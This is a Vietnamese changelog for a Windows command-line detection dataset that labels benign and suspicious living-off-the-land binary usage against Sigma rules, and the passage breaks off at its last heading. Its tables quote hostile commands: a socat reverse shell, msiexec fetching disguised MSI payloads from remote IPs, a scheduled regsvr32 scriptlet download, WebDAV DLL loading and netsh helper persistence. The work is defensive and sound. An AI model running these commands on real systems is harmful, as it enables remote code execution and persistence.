- D:/APT/lolbas-template-review-20261111/before/ lưu ba file trước sửa.

## Lịch sử trước đợt bổ sung

# Windows 7 — bổ sung hành vi có rule cảnh báo

**Cập nhật 10/11/2026.** Hiện có **3.140 lệnh: 2.754 GOOD, 386 nhãn 1 (abuse/suspicious/cần điều tra)**. Giữ nguyên toàn bộ 3.132 lệnh và nhãn cũ.

Thêm **8 mẫu nhãn 1 của 8 công cụ**, không nhân bản IP/path. Số công cụ có cả hai nhãn tăng **59 → 67**. Còn 12 nhóm GOOD-only và 2 nhóm BAD-only.

## Nhãn 1 trong đợt này có nghĩa gì?

Người dùng yêu cầu thêm các chức năng hợp pháp ít gặp mà hệ thống phát hiện vẫn cảnh báo. Vì vậy nhãn 1 được dùng cho hoạt động cần xem xét theo chính sách đã chọn, không chỉ tấn công đã xác nhận. Không suy ra độ hiếm hoặc xác suất độc hại từ việc có rule Sigma.

**Đặc biệt:** dotnet-trace chạy hello.exe là ví dụ chẩn đoán hợp lệ của Microsoft. HH mở Google là ví dụ duyệt web của nhà nghiên cứu, không phải URL C2. Hai mẫu này được đặt nhãn 1 để học chính sách cảnh báo, không được thống kê như hai cuộc tấn công hoặc dùng để tuyên bố độ chính xác phát hiện malware.

- Sáu mẫu còn lại giữ nguyên từ CSE nhãn 2, sau khi đối chiếu hành vi với rule. Nhãn nguồn cũng không phải bằng chứng độc lập xác nhận incident.
- Các rule được chọn có mức medium/high, nhưng status test hoặc experimental. Có rule công khai không có nghĩa mọi EDR/SIEM mặc định bật hoặc tất cả doanh nghiệp đều cảnh báo giống nhau.
- Rule cần telemetry Image/OriginalFileName phù hợp; InstallUtil no-log còn yêu cầu Image nằm dưới Microsoft.NET\Framework. Tên trần trong CLI không xác nhận điều kiện này.
- Một số rule rộng hơn feature dự án: Sigma cảnh báo mọi Remote.exe; dự án chỉ thêm mẫu server /s, giữ GOOD client /c được xem là hoạt động SDK đã phê duyệt. Đây là điều chỉnh phạm vi, không phải bản sao toàn bộ Sigma.
- Không sửa nhãn cũ, không đổi threshold RF/BLEU và không tự thêm corpus. Không chạy lệnh, DLL, debugger script hay payload trong dataset.

## Từng mẫu và nguồn

| Record | Công cụ | Lệnh | Cơ sở / giới hạn | Nguồn lệnh | Rule cảnh báo |
| ---: | --- | --- | --- | --- | --- |
| 8 | at | <code>C:\Windows\System32\at.exe 09:00 /interactive /every:m,t,w,th,f,s,su C:\Windows\System32\revshell.exe</code> | AT tạo interactive job. Dùng tên revshell.exe nguyên văn từ nguồn; feature dựa vào /interactive, không dựa vào tên payload. AT đã deprecated từ Windows 8; đây là mẫu legacy, không bảo đảm chạy trên Windows mới. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) | [high, test](https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_at_interactive_execution.yml) |
| 144 | cdb | <code>cdb.exe -cf x64_calc.wds -o notepad.exe</code> | CDB -cf đọc debugger script, không phải truy vấn trợ giúp. Nội dung WDS không nằm trong CLI nên không xác nhận shellcode; debugger hợp lệ là false positive đã được Sigma nêu. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) | [medium, test](https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_cdb_arbitrary_command_execution.yml) |
| 439 | dotnet-trace | <code>dotnet-trace collect -- hello.exe arg1 arg2</code> | Ví dụ chẩn đoán hợp lệ nguyên văn Microsoft. Đặt nhãn 1 theo chính sách người dùng muốn cảnh báo proxy child execution; không đổi mô tả nguồn thành tấn công. Cần tuning trên máy dev/debug. | [nguồn](https://learn.microsoft.com/en-us/dotnet/core/diagnostics/dotnet-trace) | [medium, test](https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_dotnet_trace_lolbin_execution.yml) |
| 1005 | hh | <code>hh.exe http://www.google.com</code> | Ví dụ tác giả dùng HTML Help như trình duyệt web hợp lệ. URL Google không phải C2. CLI chứa HTTP phù hợp nhánh điều kiện rule Sigma; nhãn 1 nghĩa cần xem xét việc HH truy cập mạng, không phải website độc hại. | [nguồn](https://oddvar.moe/2017/08/13/bypassing-device-guard-umci-using-chm-cve-2017-8625/) | [high, test](https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_hh_chm_remote_download_or_execution.yml) |
| 1007 | installutil | <code>InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll</code> | Tổ hợp /LogFile= rỗng và /LogToConsole=false tắt hai kênh log. Rule Sigma còn yêu cầu Image thuộc Microsoft.NET\Framework; CLI tên trần không xác minh điều kiện Image này. Có thể là uninstall automation hợp lệ. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) | [medium, test](https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_instalutil_no_log_execution.yml) |
| 2702 | remote | <code>Remote.exe /s &quot;\\10.10.10.30\binaries\file.exe&quot; anythinghere</code> | Remote /s chạy EXE từ UNC qua debugger remote server. Rule Sigma rộng hơn mẫu này, có thể cảnh báo mọi Remote.exe, kể cả GOOD /c hiện có; SDK debug được phê duyệt là ngoại lệ cần tuning. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) | [medium, test](https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_lolbin_remote.yml) |
| 2704 | replace | <code>replace.exe \\webdav.host.com\foo\bar.exe c:\outdir /A</code> | Replace có /A sao chép EXE từ UNC/WebDAV. Rule là chỉ báo cần điều tra, không chứng minh nội dung EXE độc hại. Tên host minh họa giữ nguyên của nguồn. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) | [medium, test](https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_lolbin_replace.yml) |
| 2946 | vshadow | <code>vshadow.exe -nw -exec=c:\windows\system32\calc.exe C:</code> | VShadow -exec gọi chương trình sau tạo snapshot. Calc là PoC, không phải mã độc. Callback backup hợp lệ vẫn có thể bị rule này cảnh báo; nhãn 1 ở đây là policy-positive. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) | [medium, experimental](https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_vshadow_exec.yml) |

## Đối chứng GOOD hiện có

| Công cụ | GOOD | Nhãn 1 | Dấu hiệu được thêm |
| --- | ---: | ---: | --- |
| at | 8 | 1 | win_at_interactive_job |
| cdb | 5 | 1 | win_cdb_command_mode |
| dotnet-trace | 11 | 1 | win_dotnet_trace_child |
| hh | 1 | 1 | win_hh_remote_resource |
| installutil | 23 | 1 | win_installutil_logging_suppressed |
| remote | 1 | 1 | win_remote_server_execution |
| replace | 2 | 1 | win_replace_add_files |
| vshadow | 17 | 1 | win_vshadow_execution_callback |

## Những nhóm chưa bổ sung

Còn: `dbgsrv`, `diskshadow`, `dotnet-counters`, `explorer`, `mmc`, `mpiexec`, `msbuild`, `ntsd`, `windbg`, `wsb`, `xbootmgr`, `xcopy`.

- MSBuild: rule đã đối chiếu dựa vào ParentImage; dữ liệu một dòng không có tiến trình cha. Không gán BAD cho project/logger chỉ vì tồn tại rule này.
- Diskshadow: rule script mode với đường dẫn đáng ngờ cần mẫu có nguồn phù hợp; các ví dụ /s đang có gồm backup hợp lệ. Không đổi toàn bộ script mode thành nhãn 1.
- MPIExec: rule đã kiểm tra đòi /n 1 hoặc -n 1. Mẫu nguồn mpiexec.exe whoami không thỏa điều kiện đó; /np 1 của GOOD cũng không phải cùng chuỗi cờ. Không tự thêm cờ để tạo mẫu.
- Các nhóm khác chưa có mẫu nguyên văn phù hợp với điều kiện cảnh báo đã xác minh. Không tạo biến thể để ép đủ hai nhãn.

## Feature và kiểm tra

- Bổ sung riêng Nhóm L trong rules_constants.py, gồm 8 feature hành vi tương ứng. Chỉ sinh đặc trưng, không trực tiếp ép verdict nhãn 1.
- Kiểm tra đối chứng: AT không /interactive, CDB query/help, InstallUtil có log hoặc console=true, VShadow query, HH đọc file cục bộ, Remote client, Replace /s và dotnet-trace attach process.
- Không có nhóm vector giống hệt nhau nhưng trái nhãn trong tập hiện tại. Không có mẫu GOOD cũ khớp 8 feature cảnh báo mới. Hai kiểm tra này không phải bằng chứng false positive thực tế bằng 0.
- Windows feature version v19; Linux vẫn v13. Không train lại, không cập nhật số đo README. Model Windows và train.csv cũ chưa phản ánh những mẫu mới.
- Khi đánh giá cần nêu rõ nhãn 1 bao gồm policy-positive hợp pháp. Nếu đánh giá phát hiện tấn công thực sự, cần ground truth/context riêng thay vì coi mọi cảnh báo là attack.
- Provenance đầy đủ: D:/APT/rare-command-review-20261110/provenance.jsonl. rules.json và sources/ giữ nội dung/hash rule và tài liệu để kiểm tra lại.
- SHA-256 windows_7: `5304b9ced61657a4d17a17605b7893194c74c26d6d1994b9e17782ed6cff832b`.
- SHA-256 raw: `2cdfde0789d227e14c5aa79ad66e2c27fa5067aee576c5d9a050a7d4992ccbad`.

## Vấn đề cũ ghi nhận, chưa sửa ngoài phạm vi

GOOD hiện có một dòng Replace là văn xuôi: `replace the original ones.  This is the reverse of --safe-writes.`. Đây là dữ liệu rác cần xử lý trong đợt làm sạch; đợt bổ sung này giữ nguyên nhãn/lệnh cũ để không trộn thay đổi.

## Lịch sử — bản 3.132 lệnh

Các số lượng, record và danh sách nhóm thiếu nhãn phía dưới là lịch sử; dùng thông tin ở đầu tài liệu cho bản hiện tại.

## Windows 7 — chính sách cảnh báo Netsh helper

**Cập nhật 10/11/2026.** Tổng **3.132 lệnh: 2.754 GOOD, 378 BAD/Abuse/Suspicious**. Giữ nguyên mọi lệnh và nhãn của bản 3.128 mẫu.

Thêm 3 mẫu nhãn 1 của Netsh và 1 đối chứng GOOD cùng thao tác. Netsh hiện có **395 GOOD / 3 BAD**. Số công cụ có cả hai nhãn tăng **58 → 59**; còn 20 nhóm GOOD-only và 2 nhóm BAD-only.

### Quyết định gán nhãn

Người dùng xác nhận ưu tiên cảnh báo những hành vi hiếm/đáng ngờ như nạp Netsh helper từ Windows Temp. Trong đợt này, nhãn 1 gồm hành vi suspicious cần điều tra, không chỉ mã độc đã xác nhận. Quyết định này thay thế việc để pending Netsh trong nhật ký đợt trước. Không tự mở rộng nhãn 1 cho mọi công cụ hoặc mọi lệnh ít gặp.

- Sigma có rule process creation nhận diện add helper, mức medium, status test. Rule registry riêng cho DLL ở vị trí đáng ngờ có mức high, status test; danh sách gồm Windows Temp, Users Public, AppData Local Temp và một số folder khác.
- Mức high của rule registry không được trình bày thành mức high cho mọi dòng CLI. Đây là hai rule dùng hai loại telemetry khác nhau.
- MITRE DET0575 khuyến nghị kết hợp registry, module load và tiến trình con. Không có số đo prevalence trong nguồn này để khẳng định tần suất sử dụng trên mọi doanh nghiệp.
- Windows không tự bảo đảm phát cảnh báo chỉ vì lệnh xuất hiện. Hệ thống thực tế cần thu thập telemetry, triển khai/bật detection và điều chỉnh danh sách được phê duyệt.
- GOOD của ví dụ Microsoft giả định helper quản trị được phê duyệt. C:\dlls không phải allowlist tin cậy tuyệt đối; DLL ở System32 cũng có thể độc hại. Nhãn của mẫu không thay thế kiểm tra chữ ký/hash, nguồn DLL và phê duyệt thay đổi.
- Ba mẫu BAD gồm một ví dụ người dùng cung cấp, một ví dụ thực hành persistence công khai và một mẫu CSE nguyên văn gán nhãn 2. Không tự nhân bản IP/path để tăng số lượng.

[Sigma process creation](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_netsh_helper_dll_persistence.yml), [Sigma suspicious registry location](https://github.com/SigmaHQ/sigma/blob/master/rules/windows/registry/registry_set/registry_set_netsh_help_dll_persistence_susp_location.yml), [MITRE DET0575](https://attack.mitre.org/detectionstrategies/DET0575/).

### Các mẫu bổ sung

| Record | Nhãn | Lệnh | Căn cứ và giới hạn | Nguồn |
| ---: | ---: | --- | --- | --- |
| 1591 | 1 | <code>netsh.exe add helper c:\temp\nethelp.dll</code> | Ví dụ persistence được tác giả công bố, nạp DLL từ C:\temp. Khôi phục theo tiêu chí ưu tiên cảnh báo người dùng xác nhận; không chứng minh mọi DLL trong Temp độc hại. | [nguồn](https://www.chadduffey.com/persistence/2020/06/05/Windows-Persistence) |
| 1592 | 1 | <code>netsh.exe add helper C:\Users\User\file.dll</code> | Mẫu CSE nguyên văn gán 2, ánh xạ thành 1 theo chính sách suspicious. Nạp helper từ profile người dùng là heuristic mở rộng của dự án, không phải nguyên văn danh sách thư mục trong rule Sigma. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) |
| 1593 | 1 | <code>netsh.exe add helper C:\Windows\Temp\file.dll</code> | Mẫu do người dùng cung cấp. Đăng ký helper DLL từ Windows Temp; nhãn 1 là suspicious cần điều tra theo chính sách cảnh báo, không phải incident độc hại đã xác minh. | Lệnh do người dùng cung cấp trong hội thoại |
| 1681 | 0 | <code>netsh add helper C:\dlls\HelperDLL.dll</code> | Đối chứng cùng thao tác add helper từ ví dụ Microsoft. Nhãn GOOD có điều kiện: DLL quản trị đã được phê duyệt. Đường dẫn C:\dlls tự nó không xác nhận chữ ký/nội dung DLL. | [nguồn](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-add) |

### Trích xuất đặc trưng và kiểm tra

- Bổ sung Nhóm K: win_netsh_helper_risky_location. Chỉ khớp add helper với DLL ở Temp, PerfLogs, profile người dùng hoặc biến môi trường tương ứng. Toàn bộ profile/biến môi trường là heuristic mở rộng của dự án, không phải bản dịch nguyên văn rule Sigma và không xác minh ACL thực tế.
- Giữ feature add helper chung và thêm feature vị trí. Không ép verdict thành BAD, không thay đổi RF threshold, BLEU hoặc corpus. Lệnh delete/show helper không khớp feature mới.
- Đối chứng có cùng thao tác add helper nhưng không có feature vị trí rủi ro. Kiểm tra cả Windows Temp, đường dẫn quoted, biến môi trường, cmd /c, đuôi .dll.txt và echo chỉ chứa chuỗi lệnh.
- Không có nhóm vector giống hệt nhau nhưng trái nhãn trong tập hiện tại. Đây là kiểm tra biểu diễn, không phải bằng chứng F1 tăng hay false positive bằng 0.
- Windows feature version v18; Linux vẫn v13. Chưa train model Windows mới. Model/feature train.csv và số đo README vẫn thuộc lần huấn luyện trước; cần train lại trước khi scan/evaluate.
- Hai CSV được đồng bộ đúng schema cũ; raw được backup nguyên byte. Không chạy bất kỳ lệnh dataset nào, không tải/chạy DLL.
- Đầy đủ source_kind/family/record/hash nguồn được lưu tại D:/APT/netsh-helper-review-20261110/provenance.jsonl và sources.json.
- SHA-256 windows_7: `827934f6b44bb122ebba871fadf82df45b0829030c64773bfe3d8ba45025b2b1`.
- SHA-256 raw: `fb6431ccd000efca63bd135ed6fa81b73dad082479b893a568ca50d1945f5630`.

### Lịch sử — chính sách trước khi ưu tiên cảnh báo Netsh

Các số lượng, record và quyết định pending Netsh phía dưới là lịch sử. Áp dụng quyết định mới ở đầu tài liệu cho bản hiện tại.

### Windows 7 — bổ sung BAD có đối chứng cùng công cụ

**Ngày rà soát: 10/11/2026.** Tổng **3.128 lệnh: 2.753 GOOD, 375 BAD/Abuse/Suspicious**. Giữ nguyên toàn bộ 3.120 lệnh và nhãn của bản trước.

Thêm **8 BAD cho 4 công cụ**, tăng số nhóm có cả hai nhãn **54 → 58**. Nhóm chỉ có GOOD giảm **25 → 21**. Vẫn còn 2 nhóm chỉ có BAD là mscopilot và mscopilot_proxy.

#### Tiêu chí chọn mẫu

- Chỉ thêm chuỗi lệnh có nguồn. Không điền template, đổi IP/path hoặc nhân bản mẫu trong đợt này. Một ví dụ Schtasks sửa token executable bị lặp và định dạng HTML của bài gốc; giữ nguyên action/URL/cờ/lịch chạy.
- Mẫu BAD phải thể hiện cơ chế rõ hơn tên công cụ: MSI giả đuôi PNG qua HTTP, REGSVR nạp thư viện giả đuôi TXT qua UNC/WebDAV, task gọi remote scriptlet và Bash/Socat nối socket với shell.
- Đây là nhãn abuse/suspicious theo phạm vi mô hình. Không cam kết nhận biết ý định của mọi quản trị viên hoặc red team chỉ bằng một dòng lệnh.
- Bốn mẫu MSI dùng cùng F12E5CE5.Png từ nguồn CSE được giữ nguyên để truy xuất nguồn, có chung family; không tính chúng là bốn cơ chế độc lập. Khi đánh giá phải đặt cùng family vào cùng split để tránh rò rỉ biến thể.
- Nhãn 2 CSE được kiểm tra cơ chế rồi ánh xạ thành 1, không nhập mọi nhãn 1/2 của nguồn. Không tải payload hay chạy lệnh dataset.

#### Mẫu mới

| Record | Công cụ | Nhãn | Lệnh | Cơ sở / giới hạn | Nguồn |
| ---: | --- | ---: | --- | --- | --- |
| 16 | bash | 1 | <code>bash.exe -c &quot;socat tcp-connect:192.168.1.9:66 exec:sh,pty,stderr,setsid,sigint,sane&quot;</code> | Socket TCP gắn trực tiếp với exec:sh và PTY; không phải chỉ chạy bash hay lệnh discovery. Cần WSL và socat đã cài. Mẫu abuse, không chứng minh mọi phiên hỗ trợ từ xa đều độc hại. None; command preserved from source. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Bash.yml) |
| 1180 | msiexec | 1 | <code>Msiexec  /i http://1.248.75.8:17182/F12E5CE5.Png /Q</code> | MSI được cài im lặng từ HTTP nhưng giả đuôi PNG trên IP với port không chuẩn. Không gán BAD cho mọi /i, /quiet hoặc URL. Nhãn 2 nguồn được kiểm tra cơ chế rồi ánh xạ thành 1; chưa xác minh độc lập từng incident. None; command preserved from source. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) |
| 1183 | msiexec | 1 | <code>Msiexec  /i http://103.133.122.79:17629/F12E5CE5.Png /Q</code> | MSI được cài im lặng từ HTTP nhưng giả đuôi PNG trên IP với port không chuẩn. Không gán BAD cho mọi /i, /quiet hoặc URL. Nhãn 2 nguồn được kiểm tra cơ chế rồi ánh xạ thành 1; chưa xác minh độc lập từng incident. None; command preserved from source. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) |
| 1181 | msiexec | 1 | <code>Msiexec  /i http://103.107.189.182:17308/F12E5CE5.Png /Q</code> | MSI được cài im lặng từ HTTP nhưng giả đuôi PNG trên IP với port không chuẩn. Không gán BAD cho mọi /i, /quiet hoặc URL. Nhãn 2 nguồn được kiểm tra cơ chế rồi ánh xạ thành 1; chưa xác minh độc lập từng incident. None; command preserved from source. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) |
| 1182 | msiexec | 1 | <code>Msiexec  /i http://103.107.189.186:17686/F12E5CE5.Png /Q</code> | MSI được cài im lặng từ HTTP nhưng giả đuôi PNG trên IP với port không chuẩn. Không gán BAD cho mọi /i, /quiet hoặc URL. Nhãn 2 nguồn được kiểm tra cơ chế rồi ánh xạ thành 1; chưa xác minh độc lập từng incident. None; command preserved from source. | [nguồn](https://github.com/csedikaf/LOTLDetector/blob/21e553a933abc4ff55107b76f3b0f1bf89f713fe/data/%E8%AE%AD%E7%BB%83%E6%95%B0%E6%8D%AE%E9%9B%86/windows_commands.xlsx) |
| 1184 | msiexec | 1 | <code>msiexec /q /i http://192.168.100.3/tmp/cmd.png</code> | PoC của tác giả cài MSI giả đuôi ảnh PNG. Mẫu lab, không phải incident độc lập. None; command preserved from source. | [nguồn](https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/) |
| 1992 | odbcconf | 1 | <code>odbcconf /s /a {regsvr \\webdavserver\folder\payload_dll.txt}</code> | REGSVR nạp mã qua UNC/WebDAV và tên tệp giả đuôi TXT; khác đăng ký oleaut32.dll cục bộ. webdavserver là tên host minh họa nguyên bản của nguồn, không phải dữ liệu incident. None; command preserved from source. | [nguồn](https://github.com/adobe/libLOL/blob/4baf4f852c58e7eb5db67686e9a9b4476b0e61f6/data/cmd_huge_known_commented.csv) |
| 2816 | schtasks | 1 | <code>schtasks /create /sc MINUTE /tn &quot;SystemSoundsServices&quot; /tr &quot;\&quot;regsvr32.exe\&quot; /s /n /u /i:http://193.169.245.137:80/g4.ico scrobj.dll&quot; /mo 30 /F</code> | Task thực thi regsvr32 /i:http và scrobj.dll để chạy scriptlet từ xa, không dựa vào tên task hay lịch chạy. Nguồn mô tả APT32. Remove duplicated executable token schtasks.exe before schtasks; remove HTML/inline-code formatting only. Preserve task/action/URL/schedule/flags. | [nguồn](https://www.picussecurity.com/resource/blog/picus-10-critical-mitre-attck-techniques-1053-scheduled-task) |

#### Đối chiếu với GOOD hiện có

| Công cụ | GOOD | BAD | Khác biệt quan sát được |
| --- | ---: | ---: | --- |
| bash | 2 | 1 | Socket TCP nối EXEC:sh, không phải chỉ -c echo/login. |
| msiexec | 284 | 5 | Target HTTP giả đuôi PNG; giữ GOOD cài agent.msi qua HTTP, không gán BAD cho mọi URL. |
| odbcconf | 2 | 1 | REGSVR thư viện từ UNC giả đuôi TXT, khác oleaut32.dll cục bộ; /F my.rsp vẫn không đủ phân biệt. |
| schtasks | 73 | 1 | Nội dung /tr là regsvr32 /i:http + scrobj.dll; không dựa vào task name, /RU SYSTEM hay lịch MINUTE. |

#### Những nhóm chưa thêm BAD

GOOD-only mô tả nhãn của các mẫu hiện có, không có nghĩa công cụ không thể bị tấn công. Chưa ép đủ hai lớp khi nguồn chỉ có CLI mơ hồ.

| Công cụ | GOOD hiện có | Vì sao chưa thêm | Nguồn đã đối chiếu |
| --- | ---: | --- | --- |
| at | 8 | Lên lịch chạy một EXE hoặc tạo tài khoản có thể là quản trị. Tên revshell/Hacker và nhãn nguồn không đủ thay thế hành vi nhìn thấy được. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/At.yml) |
| cdb | 5 | -cf/-c chỉ đường dẫn script ngoài hoặc attach theo PID; không nhìn thấy script/debugger actions trong một dòng CLI. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Cdb.yml) |
| dbgsrv | 1 | Kênh debug và -c có công dụng hợp lệ; thiếu hành động nhạy cảm cụ thể của tiến trình con. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Dbgsrv.yml) |
| diskshadow | 4 | /s script cũng có trong mẫu backup GOOD; cần đọc script. Prompt diskshadow> không phải CLI process creation. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Diskshadow.yml) |
| dotnet-counters | 6 | collect -- EXE là chức năng chẩn đoán hợp lệ; duration ngắn không tự chứng minh abuse. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/dotnet-counters.yml) |
| dotnet-trace | 11 | collect -- EXE là chức năng chẩn đoán hợp lệ; cần biết ứng dụng và nội dung chạy. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/dotnet-trace.yml) |
| explorer | 3 | Mở EXE bằng Explorer không tự phân biệt được mục đích. Chuỗi worm có attrib/xcopy là nhiều hành vi, không quy BAD cho riêng lệnh mở Explorer. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Explorer.yml) |
| hh | 1 | CHM/URL cần nội dung để phân biệt. Không đưa ví dụ calc, some.url hoặc tự điền .bat URL làm bằng chứng incident. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Hh.yml) |
| installutil | 23 | /U và tắt console/log vẫn là cờ uninstall hợp lệ. Assembly bên ngoài không có nội dung trong CLI; không gán BAD chỉ vì tên AllTheThings/payload. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Installutil.yml) |
| mmc | 1 | gpedit.msc và mmc.exe có công dụng quản trị trực tiếp. Exploit dựa vào nội dung MSC/registry không thể suy ra từ tên công cụ. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Mmc.yml) |
| mpiexec | 6 | Proxy chạy tiến trình có thể là tác vụ MPI hợp lệ; whoami đơn lẻ không đủ bằng chứng abuse. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Mpiexec.yml) |
| msbuild | 11 | Build project, response file và logger tùy chỉnh là chức năng hợp lệ. Chưa có mẫu một dòng đủ rõ mà không cần nội dung project/DLL. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Msbuild.yml) |
| netsh | 394 | Microsoft công bố add helper là chức năng mở rộng hợp lệ. Ví dụ DLL trong Temp vẫn cần xác minh DLL; không đổi thành BAD chỉ để đủ cặp nhãn. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Netsh.yml) |
| ntsd | 3 | -g EXE là cách debug bình thường; cần biết payload/debugger actions. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Ntsd.yml) |
| remote | 1 | /s EXE và file mạng có thể là remote console hợp lệ. Chưa có hành vi attack rõ hơn trong CLI nguồn được kiểm tra. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Remote.yml) |
| replace | 2 | Copy CAB/EXE kể cả từ SMB không đủ phân biệt với triển khai phần mềm hợp lệ. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OSBinaries/Replace.yml) |
| vshadow | 17 | -exec là callback backup hợp lệ; cần biết nội dung chương trình, không dùng tên evil/calc làm đặc trưng độc hại. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Vshadow.yml) |
| windbg | 1 | -g EXE là chức năng debugger; không gán BAD riêng vì khởi chạy calc. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/WinDbg.yml) |
| wsb | 6 | Chạy/chia sẻ folder trong Sandbox hợp lệ; mẫu nhiều bước cần ngữ cảnh, không phải một CLI attack tự đủ nghĩa. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/Wsb.yml) |
| xbootmgr | 1 | callback/preTraceCmd là chức năng tự động hóa tracing; cần nội dung/nguồn gốc EXE. | [nguồn](https://github.com/LOLBAS-Project/LOLBAS/blob/2056cb7662509dc998fc6ce79636aec4e6c0397f/yml/OtherMSBinaries/XBootMgr.yml) |
| xcopy | 23 | Không có entry tương ứng trong snapshot LOLBAS đã đối chiếu. Sao chép tệp tự nó chưa chứng minh attack. | [nguồn](https://lolbas-project.github.io/) |

##### Riêng Netsh

Đã đối chiếu ví dụ persistence nạp nethelp.dll từ Temp, nhưng không nhập nó thành BAD. Microsoft mô tả add helper là chức năng hợp lệ. Hai ví dụ này đang cùng vector, song thêm regex chỉ để tách Temp với C:\dlls không giải quyết được việc thiếu nội dung DLL. Giữ pending thay vì tự suy ra nhãn từ thư mục.
[Microsoft: netsh add](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/netsh-add), [ví dụ persistence](https://www.chadduffey.com/persistence/2020/06/05/Windows-Persistence).

#### Feature, kiểm tra và model

